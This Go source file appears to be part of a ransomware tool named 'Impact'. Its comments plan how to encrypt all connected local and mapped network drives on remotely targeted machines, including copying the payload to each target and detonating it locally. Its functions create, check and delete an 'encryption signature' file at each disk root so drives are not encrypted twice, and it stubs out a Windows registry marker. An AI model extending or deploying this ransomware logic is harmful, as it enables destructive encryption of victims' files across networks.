package main

import (
	"errors"
	"os"
	"path/filepath"
)

// In general, we want to deploy an auto capable for targeting all connected drives
// This works fine for local logical disks - but we may have a concurrency problem with mapped drives
// For example, if we target PC A and PC B simultaneously and they both have a drive mapped to PC C, we would end up double encrypting
// This is mainly for the situation where we are targeting things remotely
// I see two solutions to this problem
// Solution 1: We drop a file in every directory that is a statically unique name that tells the encryptor 'this dir is already being encrypted'
//	This can have potential race problems
// Solution 2: We NEVER encrypt network drives remotely - instead, if we are doing targets AND '*', we copy impact to the target and detonate locally
// This saves us a lot of headaches but does require some type of admin to launch remotely
// The alternative is doing more targeted to shares we have access to

// As a general check, to determine if we have encrypted a disk already, we will create a unique signature in the local registry of the device storing the disk
// This means that for local disks, great, we check the registry (Windows only obviously)
// So we can just process local drives after this
// BUT - for network shares, what we will do is create a file at the root directory indicating encryption
// Then, we check to see if our unique encryption signature already exists on disk and if it does, we skip that disk

// CreateEncryptionSignature - Creates a unique file based on the currently used public key at the root directory of each disk encrypted
// Then we can check for this file and decrypt it with our private key to determine if we should proceed with encryption on this drive or not
func CreateEncryptionSignature(file string) error {
	f, err := os.Create(file)
	if err != nil {
		return err
	}
	f.Close()
	return nil
}

func DoesEncryptionSignatureExist(dir string, filename string) bool {
	path := filepath.Join(dir, filename)
	_, err := os.Stat(path)
	if errors.Is(err, os.ErrNotExist) {
		return false
	} else {
		// Technically could be other errors here, but if we can't stat this file something is majorly wrong
		return true
	}
}

func DeleteEncryptionSignature(file string) error {
	err := os.Remove(file)
	if err != nil {
		return err
	}
	return nil
}

// We will derive a registry path and create this based on the asymmetric key in use for the encryption/decryption
// CreateRegistrySignature - Used to create a globally unique signature on an endpoint that indicates 'this endpoint is already encrypted' to prevent duplication
func CreateRegistrySignature(asym AsymKeyHandler) {
	/*	keyPath := `SOFTWARE\Impact\`
		keyName := "YourValueName"
		keyValue := "Your Value Data"*/
}

func CheckRegistrySignature(asym AsymKeyHandler) {

}
